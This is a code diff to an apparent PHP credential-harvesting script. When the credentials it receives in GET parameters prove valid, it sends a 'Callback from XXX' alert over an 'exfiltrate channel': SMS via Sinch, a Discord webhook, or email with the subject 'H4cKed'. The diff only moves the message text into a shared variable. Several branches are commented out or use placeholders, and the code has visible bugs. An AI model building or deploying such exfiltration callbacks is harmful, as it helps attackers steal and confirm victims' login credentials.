@@ -18,7 +18,7 @@ if($_GET['user'] and $_GET['password']){
     if($valid_creds){
     
         // TODO: choose the exfiltrate channel : Discord, SMS, IRC, email, ...
-    
+        $message = "Callback from XXX";
         if(isset($_GET["chan"])!==null && $_GET["chan"]){
             $chan = $_GET("chan");
             switch($chan){
@@ -32,7 +32,7 @@ if($_GET['user'] and $_GET['password']){
                     // TODO find a phone number to send the message
                     $send_from = "YOUR_Sinch_virtual_number";
                     $recipient_phone_numbers = "recipient_phone_numbers"; 
-                    $message = "Callback from XXX";
+                    
                     if(stristr($recipient_phone_numbers, ',')){
                       $recipient_phone_numbers = explode(',', $recipient_phone_numbers);
                     }else{
@@ -67,7 +67,7 @@ if($_GET['user'] and $_GET['password']){
                     /*
                     $url = "https://discordapp.com/api/webhooks/xxxxxxxxx";
                     $headers = [ 'Content-Type: application/json; charset=utf-8' ];
-                    $POST = [ 'username' => 'whoishere', 'content' => 'Callback from XXX' ];
+                    $POST = [ 'username' => 'whoishere', 'content' => $message ];
                     $ch = curl_init();
                     curl_setopt($ch, CURLOPT_URL, $url);
                     curl_setopt($ch, CURLOPT_POST, true);
@@ -81,9 +81,8 @@ if($_GET['user'] and $_GET['password']){
                 case 'EMAIL';
                     // TODO send EMAIL               
                     /*
-                    $msg = "Callback from XXX";
                     $msg = wordwrap($msg,70);
-                    mail("TBD","H4cKed",$msg);
+                    mail("TBD","H4cKed",$message);
                     */
                     break;
             }
